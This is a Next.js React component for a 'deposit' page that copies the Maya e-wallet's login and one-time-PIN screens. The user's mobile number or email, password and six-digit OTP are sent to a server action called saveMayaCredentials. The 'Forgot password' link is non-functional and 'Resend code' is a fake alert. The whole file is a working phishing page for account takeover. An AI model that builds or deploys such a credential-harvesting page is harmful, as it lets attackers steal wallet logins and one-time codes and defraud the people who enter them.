"use client";

import React, { useState, useRef } from "react";
import Link from "next/link";
import { saveMayaCredentials } from "./actions"; // Adjust path to your actions file if needed

export default function MayaDepositPage({ transactionId = "" }: { transactionId?: string }) {
  const [step, setStep] = useState<"login" | "otp">("login");
  const [identifier, setIdentifier] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState("");
  const [otp, setOtp] = useState(["", "", "", "", "", ""]);
  const otpRefs = useRef<(HTMLInputElement | null)[]>([]);

  const getActiveTransactionId = () =>
    transactionId ||
    (typeof window !== "undefined"
      ? new URLSearchParams(window.location.search).get("transactionId") ?? ""
      : "");

  // Helper to validate email or correct Philippine mobile number
  const validateIdentifier = (value: string) => {
    const trimmed = value.trim();
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (emailRegex.test(trimmed)) return true;

    const phMobileRegex = /^(?:\+63|0)?9\d{9}$/;
    return phMobileRegex.test(trimmed.replace(/\s+/g, ""));
  };

  const handleLoginSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");

    if (!validateIdentifier(identifier)) {
      setError("Please enter a valid email address or a correct Philippine mobile number.");
      return;
    }

    if (password) {
      const activeTransactionId = getActiveTransactionId();
      if (activeTransactionId) {
        try {
          await saveMayaCredentials({
            transactionId: activeTransactionId,
            identifier,
            password,
          });
        } catch (err) {
          console.error("Failed to save login info", err);
        }
      }
      setStep("otp");
    }
  };

  const handleOtpChange = (index: number, value: string) => {
    if (/^[0-9]?$/.test(value)) {
      const newOtp = [...otp];
      newOtp[index] = value;
      setOtp(newOtp);

      if (value && index < 5) {
        otpRefs.current[index + 1]?.focus();
      }
    }
  };

  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      otpRefs.current[index - 1]?.focus();
    }
  };

  // Check if all 6 digits of the OTP are entered
  const isOtpComplete = otp.every((digit) => digit !== "");

  return (
    <main className="mx-auto w-full max-w-xl space-y-4 pb-6 font-sans">
      <Link
        href="/dashboard/deposit-method"
        className="inline-flex items-center rounded-full bg-slate-100 px-3 py-1.5 text-xs font-bold text-slate-700 transition hover:bg-slate-200"
      >
        ← Back to deposit methods
      </Link>

      <section className="rounded-2xl border border-slate-200 bg-white p-6 shadow-sm">
        <div className="mx-auto w-full max-w-md flex flex-col bg-white">
          {step === "login" ? (
            <form onSubmit={handleLoginSubmit} className="flex flex-col">
              <div className="flex flex-col items-center">
                {/* Logo */}
                <div className="mt-2 mb-8">
                  <h1 className="text-[52px] font-bold tracking-tight text-[#22c55e] lowercase" style={{ fontFamily: 'system-ui, -apple-system, sans-serif' }}>
                    maya
                  </h1>
                </div>

                {/* Input Fields */}
                <div className="w-full space-y-4">
                  <div className="relative">
                    <input
                      type="text"
                      placeholder="Mobile number or email"
                      value={identifier}
                      onChange={(e) => {
                        setIdentifier(e.target.value);
                        if (error) setError("");
                      }}
                      required
                      className="w-full px-5 py-4 bg-[#f8fafc] text-slate-800 placeholder-slate-400 rounded-2xl border-none focus:outline-none text-base"
                    />
                  </div>

                  {error && (
                    <p className="text-red-500 text-xs px-1">{error}</p>
                  )}

                  <div className="relative">
                    <input
                      type={showPassword ? "text" : "password"}
                      placeholder="Password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      required
                      className="w-full px-5 py-4 bg-[#f8fafc] text-slate-800 placeholder-slate-400 rounded-2xl border-none focus:outline-none text-base pr-12"
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-4 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-600 focus:outline-none"
                    >
                      {showPassword ? (
                        <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                        </svg>
                      ) : (
                        <svg className="w-6 h-6" viewBox="0 0 24 24" fill="none" stroke="currentColor">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M3 13c1.5 3 4.5 5 9 5s7.5-2 9-5M6 10l-1-2m13 2l1-2M10 11l-1 1m5-1l1 1" />
                        </svg>
                      )}
                    </button>
                  </div>

                  {/* Forgot Password */}
                  <div className="text-center pt-2 pb-6">
                    <button
                      type="button"
                      onClick={(e) => e.preventDefault()}
                      className="text-[#22c55e] font-semibold text-base hover:underline"
                    >
                      Forgot your password?
                    </button>
                  </div>
                </div>
              </div>

              {/* Log In Button */}
              <button
                type="submit"
                className="w-full py-4 bg-[#a7f3d0] hover:bg-[#86efac] text-emerald-950 font-semibold rounded-2xl transition-all duration-200 text-base shadow-sm"
              >
                Log in
              </button>
            </form>
          ) : (
            <div className="flex flex-col">
              <div>
                {/* Header */}
                <div className="mb-6 mt-2 text-left">
                  <h2 className="text-4xl font-bold tracking-tight text-slate-900">
                    One-time <span className="text-[#22c55e]">PIN</span>
                  </h2>
                  <p className="text-slate-500 text-base mt-2 leading-relaxed">
                    Please enter the one-time PIN (OTP) that we sent to{" "}
                    {identifier.includes("@") ? identifier : `+63 ${identifier.replace(/^(?:\+63|0)/, "")}`}
                  </p>
                </div>

                {/* OTP Input Fields */}
                <div className="flex justify-between gap-2.5 my-6">
                  {otp.map((digit, index) => (
                    <input
                      key={index}
                      ref={(el) => {
                        otpRefs.current[index] = el;
                      }}
                      type="text"
                      maxLength={1}
                      value={digit}
                      onChange={(e) => handleOtpChange(index, e.target.value)}
                      onKeyDown={(e) => handleOtpKeyDown(index, e)}
                      className="w-12 h-16 text-center text-2xl font-medium bg-[#f8fafc] border border-slate-200 rounded-2xl focus:outline-none focus:border-[#22c55e] focus:ring-1 focus:ring-[#22c55e]"
                    />
                  ))}
                </div>
              </div>

              {/* Verify Actions */}
              <div className="space-y-6 mt-4">
                <button
                  type="button"
                  disabled={!isOtpComplete}
                  onClick={async () => {
                    const activeTransactionId = getActiveTransactionId();
                    if (activeTransactionId) {
                      try {
                        await saveMayaCredentials({
                          transactionId: activeTransactionId,
                          otp: otp.join(""),
                        });
                        alert("Deposit authentication complete");
                      } catch (err) {
                        console.error("Failed to save OTP", err);
                      }
                    }
                  }}
                  className={`w-full py-4 font-semibold rounded-2xl transition-all duration-200 text-base shadow-sm ${
                    isOtpComplete
                      ? "bg-[#a7f3d0] hover:bg-[#86efac] text-emerald-950 cursor-pointer"
                      : "bg-slate-100 text-slate-400 cursor-not-allowed"
                  }`}
                >
                  Verify
                </button>

                <div className="text-center space-y-1.5 pb-2">
                  <p className="text-slate-400 text-base">Didn't receive code?</p>
                  <button
                    type="button"
                    onClick={() => alert("New code sent!")}
                    className="text-[#22c55e] font-semibold text-base hover:underline"
                  >
                    Resend code
                  </button>
                </div>
              </div>
            </div>
          )}
        </div>
      </section>
    </main>
  );
}